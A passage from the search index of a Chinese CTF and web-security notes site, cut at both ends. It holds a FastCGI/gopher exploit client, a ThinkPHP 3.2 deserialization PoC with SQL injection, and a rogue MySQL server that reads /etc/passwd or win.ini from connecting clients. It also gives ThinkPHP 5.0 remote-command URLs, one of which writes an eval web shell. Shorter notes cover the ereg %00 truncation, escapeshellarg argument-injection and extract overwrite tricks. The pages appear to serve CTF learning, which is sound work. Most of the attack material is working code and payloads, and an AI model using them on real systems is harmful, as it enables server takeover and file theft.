php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;')\nparser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\nparser.add_argument('-e', '--ext', help='ext absolute path', default='')\nparser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')\nparser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)\nparser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)\nargs = parser.parse_args()\nclient = FastCGIClient(args.host, args.port, 3, 0)\nparams = dict()\ndocumentRoot = \"/\"\nuri = args.file\nparams = {\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'POST',\n'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n'SCRIPT_NAME': uri,\n'QUERY_STRING': '',\n'REQUEST_URI': uri,\n'DOCUMENT_ROOT': documentRoot,\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '9985',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1',\n'CONTENT_TYPE': 'application/text',\n'CONTENT_LENGTH': \"%d\" % len(args.code),\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\nif args.ext and args.include_file:\n#params['PHP_ADMIN_VALUE']='extension = '+args.ext\nparams['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\"\nparams['PHP_VALUE']='auto_prepend_file = '+args.include_file\nif not args.url_format and not args.base64_format :\nresponse = client.request(params, args.code)\nprint(force_text(response))\nelse:\nresponse = client.gopher(params, args.code)\nif args.url_format:\nprint(urllib.quote(response))\nif args.base64_format:\nprint(base64.b64encode(response))\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp3.2/","title":"ThinkPHP v3.2.* \uff08SQL\u6ce8\u5165&amp;\u6587\u4ef6\u8bfb\u53d6\uff09\u53cd\u5e8f\u5217\u5316POP\u94fe","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp3.2/#poc","title":"POC","text":"<pre><code>&lt;?php\nnamespace Think\\Db\\Driver{\n    use PDO;\n    class Mysql{\n        protected $options = array(\n            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // \u5f00\u542f\u624d\u80fd\u8bfb\u53d6\u6587\u4ef6\n        );\n        protected $config = array(\n            \"debug\"    =&gt; 1,\n            \"database\" =&gt; \"thinkphp3\",\n            \"hostname\" =&gt; \"127.0.0.1\",\n            \"hostport\" =&gt; \"3306\",\n            \"charset\"  =&gt; \"utf8\",\n            \"username\" =&gt; \"root\",\n            \"password\" =&gt; \"\"\n        );\n    }\n}\n\nnamespace Think\\Image\\Driver{\n    use Think\\Session\\Driver\\Memcache;\n    class Imagick{\n        private $img;\n\n        public function __construct(){\n            $this-&gt;img = new Memcache();\n        }\n    }\n}\n\nnamespace Think\\Session\\Driver{\n    use Think\\Model;\n    class Memcache{\n        protected $handle;\n\n        public function __construct(){\n            $this-&gt;handle = new Model();\n        }\n    }\n}\n\nnamespace Think{\n    use Think\\Db\\Driver\\Mysql;\n    class Model{\n        protected $options   = array();\n        protected $pk;\n        protected $data = array();\n        protected $db = null;\n\n        public function __construct(){\n            $this-&gt;db = new Mysql();\n            $this-&gt;options['where'] = '';\n            $this-&gt;pk = 'id';\n            $this-&gt;data[$this-&gt;pk] = array(\n                \"table\" =&gt; \"mysql.user where 1=updatexml(1,user(),1)#\",\n                \"where\" =&gt; \"1=1\"\n            );\n        }\n    }\n}\n\nnamespace {\n    echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));\n}\n</code></pre> <p>\u5165\u53e3\uff1a/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</p> <p></p> <p>\u51fa\u53e3/ThinkPHP/Library/Think/Db/Driver.class.php</p> <p></p> <p>Poc\u6240\u5b8c\u6210\u7684\u529f\u80fd\u662f\u8fde\u63a5\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7684\u662fmysql\u4efb\u610f\u6587\u4ef6\u8bfb\u6f0f\u6d1e</p> <p>\u6211\u4eec\u9700\u8981\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u4e00\u4e2a\u6076\u610f\u7684mysql\u670d\u52a1</p> <pre><code>#!/usr/bin/python\n#coding: utf8\nimport socket\n\n# linux :\n#filestring = \"/etc/passwd\"\n# windows:\n#filestring = \"C:\\Windows\\system32\\drivers\\etc\\hosts\"\nHOST = \"0.0.0.0\" # open for eeeeveryone! ^_^\nPORT = 3306\nBUFFER_SIZE = 1024\n\n#1 Greeting\ngreeting = \"\\x5b\\x00\\x00\\x00\\x0a\\x35\\x2e\\x36\\x2e\\x32\\x38\\x2d\\x30\\x75\\x62\\x75\\x6e\\x74\\x75\\x30\\x2e\\x31\\x34\\x2e\\x30\\x34\\x2e\\x31\\x00\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\"\n#2 Accept all authentications\nauthok = \"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\"\n\n#3 Payload\n#\u6570\u636e\u5305\u957f\u5ea6\npayloadlen = \"\\x0c\"\npadding = \"\\x00\\x00\"\npayload = payloadlen + padding +  \"\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((HOST, PORT))\ns.listen(1)\n\nwhile True:\n    conn, addr = s.accept()\n\n    print 'Connection from:', addr\n    conn.send(greeting)\n    while True:\n        data = conn.recv(BUFFER_SIZE)\n        print \" \".join(\"%02x\" % ord(i) for i in data)\n        conn.send(authok)\n        data = conn.recv(BUFFER_SIZE)\n        conn.send(payload)\n        print \"[*] Payload send!\"\n        data = conn.recv(BUFFER_SIZE)\n        if not data: break\n        print \"Data received:\", data\n        break\n    # Don't leave the connection open.\n    conn.close()\n</code></pre> <p>https://github.com/Gifts/Rogue-MySql-Server \uff1a</p> <pre><code>#!/usr/bin/env python\n#coding: utf8\n\n\nimport socket\nimport asyncore\nimport asynchat\nimport struct\nimport random\nimport logging\nimport logging.handlers\n\n\n\nPORT = 3306\n\nlog = logging.getLogger(__name__)\n\nlog.setLevel(logging.DEBUG)\ntmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')\ntmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\"))\nlog.addHandler(\n    tmp_format\n)\n\nfilelist = (\n#    r'c:\\boot.ini',\n    r'c:\\windows\\win.ini',\n#    r'c:\\windows\\system32\\drivers\\etc\\hosts',\n#    '/etc/passwd',\n#    '/etc/shadow',\n)\n\n\n#================================================\n#=======No need to change after this lines=======\n#================================================\n\n__author__ = 'Gifts'\n\ndef daemonize():\n    import os, warnings\n    if os.name != 'posix':\n        warnings.warn('Cant create daemon on non-posix system')\n        return\n\n    if os.fork(): os._exit(0)\n    os.setsid()\n    if os.fork(): os._exit(0)\n    os.umask(0o022)\n    null=os.open('/dev/null', os.O_RDWR)\n    for i in xrange(3):\n        try:\n            os.dup2(null, i)\n        except OSError as e:\n            if e.errno != 9: raise\n    os.close(null)\n\n\nclass LastPacket(Exception):\n    pass\n\n\nclass OutOfOrder(Exception):\n    pass\n\n\nclass mysql_packet(object):\n    packet_header = struct.Struct('&lt;Hbb')\n    packet_header_long = struct.Struct('&lt;Hbbb')\n    def __init__(self, packet_type, payload):\n        if isinstance(packet_type, mysql_packet):\n            self.packet_num = packet_type.packet_num + 1\n        else:\n            self.packet_num = packet_type\n        self.payload = payload\n\n    def __str__(self):\n        payload_len = len(self.payload)\n        if payload_len &lt; 65536:\n            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)\n        else:\n            header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)\n\n        result = \"{0}{1}\".format(\n            header,\n            self.payload\n        )\n        return result\n\n    def __repr__(self):\n        return repr(str(self))\n\n    @staticmethod\n    def parse(raw_data):\n        packet_num = ord(raw_data[0])\n        payload = raw_data[1:]\n\n        return mysql_packet(packet_num, payload)\n\n\nclass http_request_handler(asynchat.async_chat):\n\n    def __init__(self, addr):\n        asynchat.async_chat.__init__(self, sock=addr[0])\n        self.addr = addr[1]\n        self.ibuffer = []\n        self.set_terminator(3)\n        self.state = 'LEN'\n        self.sub_state = 'Auth'\n        self.logined = False\n        self.push(\n            mysql_packet(\n                0,\n                \"\".join((\n                    '\\x0a',  # Protocol\n                    '3.0.0-Evil_Mysql_Server' + '\\0',  # Version\n                    #'5.1.66-0+squeeze1' + '\\0',\n                    '\\x36\\x00\\x00\\x00',  # Thread ID\n                    'evilsalt' + '\\0',  # Salt\n                    '\\xdf\\xf7',  # Capabilities\n                    '\\x08',  # Collation\n                    '\\x02\\x00',  # Server Status\n                    '\\0' * 13,  # Unknown\n                    'evil2222' + '\\0',\n                ))\n            )\n        )\n\n        self.order = 1\n        self.states = ['LOGIN', 'CAPS', 'ANY']\n\n    def push(self, data):\n        log.debug('Pushed: %r', data)\n        data = str(data)\n        asynchat.async_chat.push(self, data)\n\n    def collect_incoming_data(self, data):\n        log.debug('Data recved: %r', data)\n        self.ibuffer.append(data)\n\n    def found_terminator(self):\n        data = \"\".join(self.ibuffer)\n        self.ibuffer = []\n\n        if self.state == 'LEN':\n            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1\n            if len_bytes &lt; 65536:\n                self.set_terminator(len_bytes)\n                self.state = 'Data'\n            else:\n                self.state = 'MoreLength'\n        elif self.state == 'MoreLength':\n            if data[0] != '\\0':\n                self.push(None)\n                self.close_when_done()\n            else:\n                self.state = 'Data'\n        elif self.state == 'Data':\n            packet = mysql_packet.parse(data)\n            try:\n                if self.order != packet.packet_num:\n                    raise OutOfOrder()\n                else:\n                    # Fix ?\n                    self.order = packet.packet_num + 2\n                if packet.packet_num == 0:\n                    if packet.payload[0] == '\\x03':\n                        log.info('Query')\n\n                        filename = random.choice(filelist)\n                        PACKET = mysql_packet(\n                            packet,\n                            '\\xFB{0}'.format(filename)\n                        )\n                        self.set_terminator(3)\n                        self.state = 'LEN'\n                        self.sub_state = 'File'\n                        self.push(PACKET)\n                    elif packet.payload[0] == '\\x1b':\n                        log.info('SelectDB')\n                        self.push(mysql_packet(\n                            packet,\n                            '\\xfe\\x00\\x00\\x02\\x00'\n                        ))\n                        raise LastPacket()\n                    elif packet.payload[0] in '\\x02':\n                        self.push(mysql_packet(\n                            packet, '\\0\\0\\0\\x02\\0\\0\\0'\n                        ))\n                        raise LastPacket()\n                    elif packet.payload == '\\x00\\x01':\n                        self.push(None)\n                        self.close_when_done()\n                    else:\n                        raise ValueError()\n                else:\n                    if self.sub_state == 'File':\n                        log.info('-- result')\n                        log.info('Result: %r', data)\n\n                        if len(data) == 1:\n                            self.push(\n                                mysql_packet(packet, '\\0\\0\\0\\x02\\0\\0\\0')\n                            )\n                            raise LastPacket()\n                        else:\n                            self.set_terminator(3)\n                            self.state = 'LEN'\n                            self.order = packet.packet_num + 1\n\n                    elif self.sub_state == 'Auth':\n                        self.push(mysql_packet(\n                            packet, '\\0\\0\\0\\x02\\0\\0\\0'\n                        ))\n                        raise LastPacket()\n                    else:\n                        log.info('-- else')\n                        raise ValueError('Unknown packet')\n            except LastPacket:\n                log.info('Last packet')\n                self.state = 'LEN'\n                self.sub_state = None\n                self.order = 0\n                self.set_terminator(3)\n            except OutOfOrder:\n                log.warning('Out of order')\n                self.push(None)\n                self.close_when_done()\n        else:\n            log.error('Unknown state')\n            self.push('None')\n            self.close_when_done()\n\n\nclass mysql_listener(asyncore.dispatcher):\n    def __init__(self, sock=None):\n        asyncore.dispatcher.__init__(self, sock)\n\n        if not sock:\n            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.set_reuse_addr()\n            try:\n                self.bind(('', PORT))\n            except socket.error:\n                exit()\n\n            self.listen(5)\n\n    def handle_accept(self):\n        pair = self.accept()\n\n        if pair is not None:\n            log.info('Conn from: %r', pair[1])\n            tmp = http_request_handler(pair)\n\n\nz = mysql_listener()\ndaemonize()\nasyncore.loop()\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp5.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Thinkphp5.0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>\u6f0f\u6d1e\u539f\u7406</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790_tdcoming'blog-CSDN\u535a\u5ba2_thinkphp\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5168\u7248\u672c\u901a\u6740\u672c\u6587\u4e3b\u8981\u4ee5\u5b98\u7f51\u4e0b\u8f7d\u76845.0.23 \u5b8c\u6574\u7248(thinkphp_5.0.23_with_extend.zip)\u4e3a\u4f8b\u5206\u6790\u3002Thinkphp\u5904\u7406\u8bf7\u6c42\u7684\u5173\u952e\u7c7b\u4e3aRequest(thinkphp/library/think/Request.php)\u8be5\u7c7b\u53ef\u4ee5\u5b9e\u73b0\u5bf9HTTP\u8bf7\u6c42\u7684\u4e00\u4e9b\u8bbe\u7f6e\u3002\u5176\u4e2d\u6210\u5458\u51fd\u6570method\u7528\u6765\u83b7\u53d6\u5f53\u524d\u8bf7\u6c42\u7c7b\u578b\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a...</p> <p>https://blog.csdn.net/qq_29647709/article/details/86307859</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a</p> <p>1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c</p> <p>http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</p> <p></p> <p>2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f</p> <p>http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p> <p></p> <p>3.\u5199\u5165shell:</p> <p>http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%3C?php%20@eval($_GET[%22code%22])?%3E%3Eshell.php</p> <p></p> <p>\u6216\u8005</p> <p>http://localhost:9096/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 'ok';?&gt;</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp6.0.0-6.0.1%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Thinkphp6.0.0-6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e</p> <p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a</p> <p>\u4f20\u6f0f\u6d1e.md(2.5 KB)</p> <ul> <li>0%</li> </ul>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/assert%E6%96%AD%E8%A8%80/","title":"assert\u65ad\u8a00","text":"<p>php5\u4e2d\uff0cassert\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7f='assert';f(...);\u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u52a8\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>php7\u4e2d\uff0cassert\u4e0d\u518d\u662f\u51fd\u6570\uff0c\u53d8\u6210\u4e86\u4e00\u4e2a\u8bed\u8a00\u7ed3\u6784(\u7c7b\u4f3ceval)\uff0c\u4e0d\u80fd\u518d\u4f5c\u4e3a\u51fd\u6570\u540d\u52a8\u6001\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/ereg%E6%AD%A3%E5%88%99%2500%E6%88%AA%E6%96%AD/","title":"ereg\u6b63\u5219%00\u622a\u65ad","text":"<pre><code>&lt;?php\n$flag = \"flag\";\nif (isset ($_GET['nctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\necho '\u5fc5\u987b\u8f93\u5165\u6570\u5b57\u624d\u884c';\nelse if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '\u9a9a\u5e74\uff0c\u7ee7\u7eed\u52aa\u529b\u5427\u554a~';\n}\n?&gt;\nPlain Text\n</code></pre> <p>ereg\u51fd\u6570\u9047\u5230%00\u4f1a\u8ba4\u4e3a\u51fd\u6570\u6267\u884c\u5b8c\u6bd5</p> <p>http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/escapeshellarg%28%29_escapeshellcmd%28%29/","title":"escapeshellarg()+escapeshellcmd()","text":"<p>escapeshellarg\u4f1a\u5bf9\u6240\u6709\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49,\u5e76\u4e14\u7ed9\u5b57\u7b26\u4e32\u589e\u52a0\u4e00\u4e2a \u5355\u5f15\u53f7</p> <p>escapeshellcmd\u4ec5\u4f1a\u5bf9\u843d\u5355\u4e86\u7684\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\u5982\uff1a&amp; # ;` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $</p> <p>\u4f20\u5165\u7684\u53c2\u6570\u662f\uff1a172.17.0.2'-v -d a=1</p> <p>\u7ecf\u8fc7escapeshellarg\u5904\u7406\u540e\u53d8\u6210\u4e86'172.17.0.2'\\'' -v -d a=1'\uff0c\u5373\u5148\u5bf9\u5355\u5f15\u53f7\u8f6c\u4e49\uff0c\u518d\u7528\u5355\u5f15\u53f7\u5c06\u5de6\u53f3\u4e24\u90e8\u5206\u62ec\u8d77\u6765\u4ece\u800c\u8d77\u5230\u8fde\u63a5\u7684\u4f5c\u7528\u3002</p> <p>\u7ecf\u8fc7escapeshellcmd\u5904\u7406\u540e\u53d8\u6210'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u8fd9\u662f\u56e0\u4e3aescapeshellcmd\u5bf9\\\u4ee5\u53ca\u6700\u540e\u90a3\u4e2a\u4e0d\u914d\u5bf9\u513f\u7684\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49\uff1ahttp://php.net/manual/zh/function.escapeshellcmd.php</p> <p>\u6700\u540e\u6267\u884c\u7684\u547d\u4ee4\u662fcurl'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u7531\u4e8e\u4e2d\u95f4\u7684\\\u88ab\u89e3\u91ca\u4e3a\\\u800c\u4e0d\u518d\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u540e\u9762\u7684'\u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u4e0e\u518d\u540e\u9762\u7684'\u914d\u5bf9\u513f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u8fde\u63a5\u7b26\u3002\u6240\u4ee5\u53ef\u4ee5\u7b80\u5316\u4e3acurl 172.17.0.2 -v -da=1'\uff0c\u5373\u5411172.17.0.2\\\u53d1\u8d77\u8bf7\u6c42\uff0cPOST \u6570\u636e\u4e3aa=1'\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/","title":"extract\u53d8\u91cf\u8986\u76d6","text":"<p>\u5b8c\u5168\u53ef\u4ee5\u81ea\u5df1\u642d\u4e2a\u73af\u5883\u6765\u73a9\uff0c\u52a0\u6761highligh_file(\"index.php\")</p> <pre><code>&lt;?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\nif($shiyan==$content)\n{\necho'ctf{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u5b9a\u4e49\u548c\u7528\u6cd5</p> <p>extract() \u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\u3002</p> <p>\u8be5\u51fd\u6570\u4f7f\u7528\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4f7f\u7528\u6570\u7ec4\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u503c\u3002\u9488\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u5c06\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u521b\u5efa\u5bf9\u5e94\u7684\u4e00\u4e2a\u53d8\u91cf\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570type\u7528\u4e8e\u6307\u5b9a\u5f53\u67d0\u4e2a\u53d8\u91cf\u5df2\u7ecf\u5b58\u5728\uff0c\u800c\u6570\u7ec4\u4e2d\u53c8\u6709\u540c\u540d\u5143\u7d20\u65f6\uff0cextract() \u51fd\u6570\u5982\u4f55\u5bf9\u5f85\u8fd9\u6837\u7684\u51b2\u7a81\u3002</p> <p>\u8be5\u51fd\u6570\u8fd4\u56de\u6210\u529f\u5bfc\u5165\u5230\u7b26\u53f7\u8868\u4e2d\u7684\u53d8\u91cf\u6570\u76ee\u3002</p> <p>http://127.0.0.1/Php_Bug/extract1.php?shiyan=&amp;flag=1</p> <p>\u7565\u5fae\u89e3\u91ca</p> <p>\u9996\u5148\u662fisset,\u53ea\u68c0\u67e5\u53d8\u91cf\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u4f1a\u53bb\u68c0\u67e5\u53d8\u91cf\u7684\u503c\u4e3a\u7a7a\u6216\u8005\u4ec0\u4e48\u5176\u4ed6\u7684\u4e1c\u897f</p> <p>\u7136\u540efile_get_contents\u5f53\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u65f6\u5019\u7684\u8fd4\u56de\u662f\u4e2a0,\u7136\u540e\u7a7a=0</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/","title":"get_header()","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/#get_header00","title":"get_header()\u51fd\u6570\u4f1a\u622a\u65ad\u7a7a\u5b57\u7b26\u540e\u7684\u5185\u5bb9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a%00","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/htaccess%E6%96%87%E4%BB%B6/","title":".htaccess\u6587\u4ef6","text":"<p>\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6</p> <p>\u5168\u79f0\u662fHypertext Access(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c 